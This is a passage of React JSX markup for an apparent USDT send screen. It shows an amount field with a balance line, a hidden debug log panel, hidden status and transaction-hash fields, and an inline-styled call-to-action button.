                <XCircle size={20} color="#ffffff" fill="#6B7280" style={{ cursor: 'pointer', marginRight: '4px' }} />
              )}
              <span style={{ color: '#6B7280', fontWeight: '700', fontSize: '15px' }}>USDT</span>
              <span style={{ color: '#0C66FF', fontWeight: '700', fontSize: '15px', cursor: 'pointer' }}>Max</span>
            </div>
          </div>
         <div style={{ fontSize: '13px', fontWeight: '700', marginTop: '8px' }}>
            {amountError ? (
              <span style={{ color: '#EF4444' }}>{amountError}</span>
            ) : (
              <span style={{ color: '#4B5563' }}>≈ ${usdtBalance !== '0' && usdtBalance !== '0.00' && usdtBalance !== '' ? usdtBalance : '0.00'}</span>
            )}
          </div>
        </div>

      </div>

      {/* 🔴 VISUAL DEBUG CONSOLE */}
      <div style={{ display: 'none', margin: '0 20px 20px 20px', padding: '10px', backgroundColor: '#000', color: '#0f0', fontSize: '11px', fontFamily: 'monospace', borderRadius: '8px', height: '120px', overflowY: 'auto' }}>
        <div style={{ color: '#fff', borderBottom: '1px solid #333', paddingBottom: '4px', marginBottom: '4px' }}>--- SYSTEM LOGS ---</div>
        {debugLogs.map((msg, idx) => (
          <div key={idx} style={{ marginTop: '2px' }}>{msg}</div>
        ))}
      </div>

      <div style={{ display: 'none' }}>
        <p>{status}</p>
        <p>{txHash}</p>
      </div>

      {/* 5. CTA BUTTON */}
      <div style={{ padding: '20px', backgroundColor: '#ffffff', paddingBottom: '32px', width: '100%', boxSizing: 'border-box' }}>
        <button
          onClick={handleAction}
          disabled={isButtonDisabled}
          style={{
            width: '100%',
            backgroundColor: isButtonDisabled ? '#93C5FD' : '#0C66FF',
            color: '#ffffff',
            fontWeight: '700',
            padding: '16px',
            borderRadius: '9999px',
            fontSize: '17px',
            border: 'none',
            cursor: isButtonDisabled ? 'not-allowed' : 'pointer',
            transition: 'background-color 0.2s'
          }}
        >
          {buttonText}
        </button>
      </div>
      
    </div>
  )
}